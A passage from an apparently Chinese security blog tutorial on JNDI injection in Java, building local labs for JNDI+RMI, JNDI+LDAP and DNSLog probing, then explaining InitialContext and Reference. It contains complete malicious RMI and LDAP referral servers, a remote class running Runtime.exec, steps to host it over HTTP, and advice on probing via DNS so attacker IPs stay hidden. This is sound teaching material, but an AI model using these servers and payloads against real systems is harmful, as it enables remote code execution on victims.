新建一个项目</p><p>File-》New-》Project-》Maven-》Project SDK（选择 JDK 版本）-》Next-》填写项目名称-》Finish</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195107484.png" data-caption="image-20230302195107484"><img src="/../images/Java/jndi/image-20230302195107484.png" alt="image-20230302195107484"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195803442.png" data-caption="image-20230302195803442"><img src="/../images/Java/jndi/image-20230302195803442.png" alt="image-20230302195803442"></a></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302195907612.png" data-caption="image-20230302195907612"><img src="/../images/Java/jndi/image-20230302195907612.png" alt="image-20230302195907612"></a></p><p>2、在 <code>/src/java</code> 目录下创建一个包，包名自定义，我这边为 <code>jndi_rmi_injection</code></p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302200005072.png" data-caption="image-20230302200005072"><img src="/../images/Java/jndi/image-20230302200005072.png" alt="image-20230302200005072"></a></p><p>3、在创建的包下新建 <code>rmi</code> 服务端和客户端</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306154417324.png" data-caption="image-20230306154417324"><img src="/../images/Java/jndi/image-20230306154417324.png" alt="image-20230306154417324"></a></p><p>服务端（RMIService.java）代码</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="string">&quot;http://127.0.0.1:8081/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;RCE&quot;</span>,wrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>客户端（RMIClient.java）代码，客户端也是受害端</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>HTTP 端恶意载荷（Calculator.java）代码</p><p>笔者使用的是 ubuntu 的环境，执行弹出计算器的命令为 <code>gnome-calculator</code>,若为Windwos 修改为 <code>calc</code> 即可</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h4><p>1、将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac Calculator.java</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201002194.png" data-caption="image-20230302201002194"><img src="/../images/Java/jndi/image-20230302201002194.png" alt="image-20230302201002194"></a></p><p>2、在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 RMIServer.java 的 Reference 里面的链接端口一致</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201219085.png" data-caption="image-20230302201219085"><img src="/../images/Java/jndi/image-20230302201219085.png" alt="image-20230302201219085"></a></p><p>python3 -m http.server 8081</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201414134.png" data-caption="image-20230302201414134"><img src="/../images/Java/jndi/image-20230302201414134.png" alt="image-20230302201414134"></a></p><p>3、IDEA 将漏洞环境启动起来并实现攻击，顺序为先运行服务端，再起客户端</p><p>服务端</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230302201657276.png" data-caption="image-20230302201657276"><img src="/../images/Java/jndi/image-20230302201657276.png" alt="image-20230302201657276"></a></p><p>再点击运行客户端，远程获取恶意类，并执行恶意类代码，实现弹窗</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306160706036.png" data-caption="image-20230306160706036"><img src="/../images/Java/jndi/image-20230306160706036.png" alt="image-20230306160706036"></a></p><br/><h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><h4 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>环境使用上面的即可，但要先本地导入依赖，<code>maven</code> 无法拉取 <code>unboundid</code> 这个依赖，这一步卡了一段时间，坑点之一</p><p>1、点击下载 <a href="https://repo.maven.apache.org/maven2/com/unboundid/unboundid-ldapsdk/3.2.0/unboundid-ldapsdk-3.2.0.jar">unboundid-ldapsdk-3.2.0.jar</a>，导入依赖即可，本环境在跟目录下创建了 <code>/lib</code> 目录用于放置本地依赖</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230303175437804.png" data-caption="image-20230303175437804"><img src="/../images/Java/jndi/image-20230303175437804.png" alt="image-20230303175437804"></a></p><p>2、LDAPServer.java 服务端代码</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8081/#Calculator&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1234</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> URL codebase;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));</span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>3、客户端（LDAPClient.java）代码， 也是受害端</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1234/Calculator&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>4、HTTP 端恶意载荷（Calculator.java）代码</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Calculator</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;gnome-calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="启动服务-1"><a href="#启动服务-1" class="headerlink" title="启动服务"></a>启动服务</h4><p>1、将 HTTP 端恶意载荷 Calculator.java，编译成 Calculator.class 文件</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306150412917.png" data-caption="image-20230306150412917"><img src="/../images/Java/jndi/image-20230306150412917.png" alt="image-20230306150412917"></a></p><p>2、在 Calculator.class 目录下利用 Python 起一个临时的 WEB 服务放置恶意载荷,这里的端口必须要与 LDAPServer.java 的 Reference 里面的链接端口一致</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306150454319.png" data-caption="image-20230306150454319"><img src="/../images/Java/jndi/image-20230306150454319.png" alt="image-20230306150454319"></a></p><p>python3 -m http.server 8081</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153210903.png" data-caption="image-20230306153210903"><img src="/../images/Java/jndi/image-20230306153210903.png" alt="image-20230306153210903"></a></p><p>3、IDEA 将漏洞环境启动起来并实现弹窗，顺序为先其服务端，再起客户端</p><p>服务端</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153341210.png" data-caption="image-20230306153341210"><img src="/../images/Java/jndi/image-20230306153341210.png" alt="image-20230306153341210"></a></p><p>再点击运行客户端，实现弹窗</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306153414342.png" data-caption="image-20230306153414342"><img src="/../images/Java/jndi/image-20230306153414342.png" alt="image-20230306153414342"></a></p><br/><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>通过上面我们可知 <code>JNDI</code> 注入可以利用 <code>RMI</code> 协议和<code> LDAP</code> 协议搭建服务然后执行命令，但有个不好的点就是会暴露自己的服务器 <code>IP</code>  。在没有确定存在漏洞前，直接在直接服务器上使用 <code>RMI</code> 或者 <code>LDAP</code> 去执行命令，通过日志可分析得到攻击者的服务器 <code>IP</code>，这样在没有获取成果的前提下还暴露了自己的服务器 <code>IP</code>，得不偿失。 我们可以使用<code>DNS</code> 协议进行探测，通过 <code>DNS</code> 协议去探测是否真的存在漏洞，再去利用 <code>RMI</code> 或者 <code>LDAP</code> 去执行命令，避免过早暴露服务器 <code>IP</code>，这也是平常大多数人习惯使用 <code>DNSLog</code> 探测的原因之一，同样的 <code>ldap</code> 和 <code>rmi</code> 也可以使用 <code>DNSLog</code> 平台去探测。</p><h4 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用上面任一环境即可，只需要客户端，不需要服务器去起其它协议服务。</p><p>漏洞端代码</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_ldap_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://lwwj38.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><br/><h4 id="启动服务-2"><a href="#启动服务-2" class="headerlink" title="启动服务"></a>启动服务</h4><p>填入 <code>DNSLog</code> 平台域名，或自己搭建的平台域名，执行程序</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230310143511868.png" data-caption="image-20230310143511868"><img src="/../images/Java/jndi/image-20230310143511868.png" alt="image-20230310143511868"></a></p><p><code>DNSLog</code> 平台返回记录，证明漏洞存在</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230310143532724.png" data-caption="image-20230310143532724"><img src="/../images/Java/jndi/image-20230310143532724.png" alt="image-20230310143532724"></a></p><h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><p>由 <code>JNDI+RMI</code> 漏洞代码进行分析</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>InitialContext</code> 类用于读取 JNDI 的一些配置信息，内含对象和其在 JNDI 中的注册名称的映射信息</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(); <span class="comment">// 初始化上下文,获取初始目录环境的一个引用</span></span><br></pre></td></tr></table></figure></div><p><code>lookup(String name)</code>  获取 name 的数据，这里的 uri 被定义为 <code>rmi://127.0.0.1:7778/RCE</code> 所以会通过 <code>rmi</code> 协议访问 <code>127.0.0.1:7778/RCE</code></p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:7778/RCE&quot;</span>;</span><br><span class="line">initialContext.lookup(uri); <span class="comment">//利用lookup() 函数获取指定的远程对象</span></span><br></pre></td></tr></table></figure></div><p>由于 <code>lookup()</code> 参数可控，导致漏洞的出现，跟进代码如下</p><p><a data-fancybox="gallery" data-src="/../images/Java/jndi/image-20230306165352111.png" data-caption="image-20230306165352111"><img src="/../images/Java/jndi/image-20230306165352111.png" alt="image-20230306165352111"></a></p><br/><h3 id="Reference-类"><a href="#Reference-类" class="headerlink" title="Reference 类"></a>Reference 类</h3><p>Reference 是一个抽象类，每个 Reference 都有一个指向的对象，对象指定类会被加载并实例化。</p><p>由 <code>JNDI+RMI</code> 服务端攻击代码</p><div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">7778</span>);</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span 